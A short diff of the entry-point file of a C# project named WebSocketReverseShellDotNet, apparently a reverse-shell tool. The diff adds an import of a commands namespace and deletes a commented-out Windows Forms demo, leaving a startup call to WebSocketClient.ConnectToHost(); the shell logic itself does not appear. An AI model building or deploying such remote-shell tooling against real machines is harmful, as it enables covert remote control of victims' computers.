@@ -4,17 +4,11 @@ using System.Diagnostics;
 using System.Runtime.CompilerServices;
 using WebSocketReverseShellDotNet.service.impl;
 using System.Windows.Forms;
+using WebSocketReverseShellDotNet.service.commands;
+
 
 
 
 ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
 WebSocketClient.ConnectToHost();
 
-/*Console.WriteLine("hello");
-
-
-Form myForm = new Form();
-
-
-
-Application.Run(myForm);*/
